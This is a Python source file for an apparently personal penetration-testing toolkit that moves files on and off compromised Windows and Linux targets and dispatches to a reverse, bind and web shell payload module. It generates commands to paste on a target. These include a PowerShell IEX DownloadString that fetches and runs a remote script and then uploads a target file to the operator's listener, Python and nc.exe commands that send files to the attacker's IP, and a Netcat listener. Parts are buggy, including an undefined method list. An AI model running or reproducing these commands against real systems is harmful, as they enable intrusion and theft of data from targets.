#!/usr/bin/env python

import os
from sys import exit, path
import argparse
import subprocess
import random
import hashlib
import string
from time import sleep
import urllib.request
from getpass import getpass

path.append('modules')
import helpers
import services
import linuxdo
import windowsdo
import poisons

# UPLOAD TO WINDOW TARGET METHODS
UploadTo_WinMethods = [
    'HTTP',
    # 'SCP',
    'Base64',
    'Netcat',
    # 'SMB',
    # 'FTP',
]

# UPLOAD FROM WINDOWS TARGET METHODS
UploadFrom_WinMethods = [
    'Base64',
    'UploadServer',
    'Python 3',
    'Netcat',
    # 'SMB',
    # 'FTP',
    # 'WebDAV',
]


# UPLOAD TO LINUX TARGET METHODS
UploadTo_NixMethods = [
    'Base64',
    'Base64 - Fileless',
    'HTTP',
    'HTTP - Fileless',
    # '/dev/tcp',
    'SCP'
]

# UPLOAD FROM LINUX TARGET METHODS
UploadFrom_NixMethods = [
    'Base64',
    # 'SMB',
    # 'FTP',
    # 'WebDAV',
]

Linux_Fileless_Types = [
    'BASH (.sh)',
    'Python (.py)'
]

# GET ABSOLUTE PATH OF FILE ON TARGET
def get_absolute_path():
    print('[?] What is the absolute path of the file on target: ', end='')
    try:
        file_absolute_path = input()
        return file_absolute_path
    except KeyboardInterrupt:
        exit(0)

# RUN COMMONLY USED COMMANDS
def run_command(args):
    # RUN NMAP SCAN
    if args.command == 'nmap':
        print('[+] Running nmap scan on ' + args.target_ip)
        subprocess.run(['nmap', '-sV', '-Pn', '-p-', '-oA', args.target_ip, '--open', args.target_ip])
    # RUN GOBUSTER DIR
    elif args.command == 'gbdir':
        print('[+] Running gobuster dir on ' + args.target_url)
        subprocess.run(['gobuster', 'dir', '-u', args.target_url, '-w', '/usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt', '>', args.target_url+'.gbdir'])
    # RUN GOBUSTER VHOST
    elif args.command == 'gbvhost':
        print('[+] Running gobuster vhost on ' + args.target_url)
        subprocess.run([['gobuster', 'vhost', '-u', args.target_url, '-w', '/usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt', '>', args.target_url+'.gbvhost']])

# UPLOAD FILES TO
def upload_to(args):
    entrymsg = '[?] What method to use?'

    if args.os == 'windows':
        # METHOD SELECTION
        method = helpers.populateChoices(entrymsg, UploadTo_WinMethods)

        if method == 'HTTP':
            windowsdo.httpUploadTo(args.filename)
        elif method == 'Base64':
            windowsdo.base64UploadTo(args.filename)
        # elif method == 'SCP':
        #     windowsdo.scpUploadTo(args.filename)
        elif method == 'Netcat':
            windowsdo.ncUploadTo(args.filename)
    elif args.os == 'linux':
        # METHOD SELECTION
        method = helpers.populateChoices(entrymsg, UploadTo_NixMethods)

        if method == 'Base64' or method == 'Base64 - Fileless':
            linuxdo.base64UploadTo(args.filename, method)        
        elif method == 'HTTP' or method == 'HTTP - Fileless':
            linuxdo.httpUploadTo(args.filename, method)
        elif method == 'SCP':
            linuxdo.scpUploadTo(args.filename)

# UPLOAD FILES FROM
def upload_from(args):
    # SEPARATE RELATIVE PATH TO FILE FROM FILENAME ITSELF
    relpath = args.filename
    args.filename = os.path.basename(os.path.normpath(args.filename))

    # GENERATE RANDOM FILENAME FOR EXTREMELY MINIMAL FILE OBFUSCATION
    rand_filename = ''.join(random.choices(string.ascii_letters, k=8))

    entrymsg = '[?] What method to use?'

    ###########################
    ### FROM WINDOWS TARGET ###
    ###########################
    if args.os == 'windows':
        # METHOD SELECTION
        method = helpers.populateChoices(entrymsg, UploadFrom_WinMethods)

        #############################
        ### WINDOWS BASE64 METHOD ###
        #############################
        if method == 'Base64':
            file_absolute_path = get_absolute_path()
            filename = file_absolute_path.split('\\')[-1]
            while True:
                cmd = '# GENERATE BASE64 STRING\n'
                cmd += '[Convert]::ToBase64String((Get-Content -path \"' + file_absolute_path + '\" -Encoding byte))\n'
                cmd += '\n# GENERATE MD5 CHECKSUM\n'
                cmd += 'Get-FileHash ' + file_absolute_path + ' -Algorithm md5'
                helpers.pasta(cmd)
                print('[?] Paste generated Base64 string here: ', end='')
                try:
                    b64 = input()
                except KeyboardInterrupt:
                    exit(0)
                print('[?] Paste generated MD5 checksum here: ', end='')
                try:
                    md5_target_hash = input()
                except KeyboardInterrupt:
                    exit(0)
                cmd = 'echo \'' + b64 + '\' | base64 -d > ' + filename
                create_file = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
                create_file.wait()
                md5_host_hash = hashlib.md5(open(filename, 'rb').read()).hexdigest()
                if md5_target_hash == md5_host_hash:
                    print('[+] File succesfully transferred to current directory')
                    break
                else:
                    cmd = 'rm ' + filename
                    subprocess.run(cmd, shell=True)
                    print('[!] MD5 checksum does not match')
                    try:
                        input('[*] Press any key to try again ...')
                    except KeyboardInterrupt:
                        exit(0)

        ###################################
        ### WINDOWS UPLOADSERVER METHOD ###
        ###################################
        elif method == 'UploadServer':
            # START UPLOADSERVER
            listenIP = helpers.whichIP()
            print('[+] Starting upload server on ' + listenIP + ':443 ...')
            try:
                uploadserver = subprocess.Popen(['python3', '-m', 'uploadserver', '-b', listenIP, '443'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                print('[+] Upload server successfully started')
            except KeyboardInterrupt:
                exit(0)
            except:
                print('[!] Failed to start upload server')
                exit(1)

            # GET FILENAME AND ABSOLUTE PATH ON TARGET
            file_absolute_path = get_absolute_path()
            filename = file_absolute_path.split('\\')[-1]

            # SELECT WHICH POWERSHELL UPLOAD METHOD
            entrymsg = '[?] Which PowerShell upload method to use on target: '
            choice = helpers.populateChoices(entrymsg, PSFrom_Methods)

            # GENERATE TARGET PASTABLES
            if choice == 'PSUpload.ps1':
                cmd = '# DOWNLOAD PSUPLOAD.PS1\n'
                cmd += 'IEX(New-Object Net.WebClient).DownloadString(\'https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1\')\n'
                cmd += '\n# UPLOAD ' + filename.upper() + ' TO UPLOAD SERVER\n'
                cmd += 'Invoke-FileUpload -Uri https://' + listenIP + '/upload -File ' + file_absolute_path
            elif choice == 'Base64':
                cmd = '# GENERATE BASE64 AND STORE IT AS A VARIABLE\n'
                cmd += '$b64 = [System.convert]::ToBase64String((Get-Content -Path \'' + file_absolute_path + '\' -Encoding Byte))\n'
                cmd += '\n# UPLOAD ' + filename.upper() + ' TO UPLOAD SERVER\n'
                cmd += 'Invoke-WebRequest -Uri https://' + listenIP + '/ -Method POST -Body $b64'
            elif choice == 'Python 3':
                cmd = 'python3 -c \'import requests;requests.post("http://' + listenIP + ':443/upload",files={"files":open("' + file_absolute_path + '","rb")})\''
            elif choice == 'Python 2.7':
                cmd = 'python2.7 -c \'import urllib;urllib.urlretrieve ("http://' + listenIP + ':443/upload",' + args.url.split('/')[-1] + ')\''
            helpers.pasta(cmd)

            # TERMINATE UPLOAD SERVER WHEN DONE
            print('[?] Close upload server? [Y/n] ', end='')
            sleep(1)
            subterminate = input().lower()
            if subterminate == '':
                subterminate = 'y'
            if subterminate == 'n':
                print('[!] HTTP server was left open')
            else:
                try:
                    uploadserver.terminate()
                    print('[+] Upload server succesfully terminated')
                except:
                    print('[!] Could not terminate upload server')

        #############################
        ### WINDOWS NETCAT METHOD ###
        #############################
        elif method == 'Netcat':
            listenIP = helpers.whichIP()
            cmd = 'nc -l -p 443 > ' + args.filename
            try:
                try:
                    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    print('[+] Netcat listener is started on ' + listenIP + ':443')
                except:
                    print('[!] Failed to start Netcat listener')
                cmd = 'nc.exe ' + listenIP + ' 443 < ' + relpath
                helpers.pasta(cmd)
                print('[?] Press Ctrl+C to cancel transfer ...')
                proc.wait()
            except KeyboardInterrupt:
                proc.terminate()
                exit(0)


    #########################
    ### FROM LINUX TARGET ###
    #########################
    elif args.os == 'linux':
        method = helpers.populateChoices(entrymsg, UploadFrom_NixMethods)

        #     print('[-] Still working on it')
            # b64_file = subprocess.run(['base64', '-w', '0', relpath], capture_output=True, text=True)
            # print('\n[===== START LINUX COMMAND =====]\n')
            # print('echo \'' + b64_file.stdout + '\' | base64 -d > ' + args.filename + ' && md5sum ' + args.filename)
            # print('\n[====== END LINUX COMMAND ======]\n')

# ENCRYPT FILES WITH SSL
def encrypt_file(args):
    # SEPARATE RELATIVE PATH TO FILE FROM FILENAME ITSELF
    relpath = args.filename
    args.filename = os.path.basename(os.path.normpath(args.filename))

    cmd = 'openssl enc -aes256 -iter 100000 -pbkdf2 -in ' + relpath + ' -out ' + args.filename + '.enc'
    try:
        proc = subprocess.run(cmd.split())

    except KeyboardInterrupt:
        exit(0)

# CRACK PASSWORDS
def password_crack(args):
    print('[?] Which cracker would you like to use?')
    print('      1) Hashcat [Default]')
    print('      2) John The Ripper')
    print('CHOICE [1/2]: ', end='')
    crackprog = input().lower()

    if crackprog == '':
        crackprog = 1

    if crackprog == 2:
        print('[*] Not yet implemented')
    else:
        print('[*] Not yet implemented')

# CONNECT TO TARGET SMB
def smb_connect(args):
    print('[+] Connecting to ' + args.target_ip + ' ...')
    smb_connection = subprocess.Popen(['smbclient', '-U', args.username, '\\\\' + args.target_ip + '\\'])
    print(smb_connection)

def main():
    # ARGUMENT PARSER
    parser = argparse.ArgumentParser(
        description='Jay\'s Toolkit',
        epilog='Use \"jref [module] -h\" for more information about a module.'
    )

    # JTK MODULES
    modules = parser.add_subparsers(title='Available Modules', dest='module')

    ##############################
    ### FILE ENCRYPTION MODULE ###
    ##############################
    encryptFile = modules.add_parser('encrypt_file', help='Encrypt a file')
    encryptFile.add_argument('filename', help='File to encrypt')

    ################################
    ### PASSWORD CRACKING MODULE ###
    ################################
    # crackpass = modules.add_parser('crackpass', help='Crack password hashes')
    # crackpass.add_argument('filename', help='File that contains password hashes to crack')

    ##########################
    ### SMB CONNECT MODULE ###
    ##########################
    # smb = modules.add_parser('smb', help='Connect to SMB server')
    # smb.add_argument('target_ip', help='SMB server IP address')
    # smb.add_argument('-u', dest='username', help='SMB username')

    #############################
    ### FILE TRANSFER MODULES ###
    #############################
    uploadto = modules.add_parser('uploadto', help='Semi-automated file transfer to target')
    uploadto.add_argument('os', help='Operating system to transfer to', choices=['windows', 'linux'])
    uploadto.add_argument('filename', help='File to transfer')
    uploadfrom = modules.add_parser('uploadfrom', help='Pastables to transfer from target')
    uploadfrom.add_argument('os', help='Operating system to transfer to', choices=['windows', 'linux'])
    uploadfrom.add_argument('filename', help='File to transfer')

    #######################
    ### DOWNLOAD MODULE ###
    #######################
    download = modules.add_parser('download', help='Download files')
    download.add_argument('url', help='URL of file to be downloaded')

    #############################################
    ### RUN MODULE FOR COMMONLY USED COMMANDS ###
    #############################################
    # run_parser = modules.add_parser('run', help='Commonly used commands')
    
    # # RUN COMMANDS
    # commands = run_parser.add_subparsers(
    #     title='Available Commands',
    #     dest='command'
    # )

    # # RUN NMAP
    # run_nmap = commands.add_parser(
    #     'nmap',
    #     help='$(nmap -sV -Pn -p- -oA <target_ip> --open <target_ip>)'
    # )
    # run_nmap.add_argument('target_ip')

    # # RUN GOBUSTER DIR
    # run_gbdir = commands.add_parser(
    #     'gbdir',
    #     help='$(gobuster dir -u <target_url> -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt > target_url.gbdir)'
    # )
    # run_gbdir.add_argument('target_url')

    # # RUN GOBUSTER VHOST
    # run_gbvhost = commands.add_parser(
    #     'gbvhost',
    #     help='$(gobuster vhost -u <target_url> -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt > target_url.gbvhost)'
    # )
    # run_gbvhost.add_argument('target_url')

    ##########################################
    ### PAYLOADS MODULE TO GENERATE SHELLS ###
    ##########################################
    payloads = modules.add_parser('payloads', help='Reverse Shell, Bind Shell, and Web Shell')
    payloads.add_argument('shell', choices=['reverse','bind','web'], help='Type of shell')
    payloads.add_argument('os', help='Target operating system', choices=['linux', 'windows'])
    # payloads.add_argument('--encode', choices=['base64','hex','nospace'])

    # PARSE ALL ARGS
    args = parser.parse_args() 
    # if args.module == 'run':
    #     run_command(args)
    if args.module == 'payloads':
        poisons.create(args.shell, args.os)
    elif args.module == 'uploadto':
        upload_to(args)
    elif args.module == 'uploadfrom':
        upload_from(args)
    elif args.module == 'download':
        linuxdo.download(args.url)
    elif args.module == 'encrypt_file':
        encrypt_file(args)
    # elif args.module == 'crackpass':
    #     password_crack(args)
    # elif args.module == 'smb':
    #     smb_connect(args)
    else:
        parser.print_help()

if __name__ == '__main__':
    main()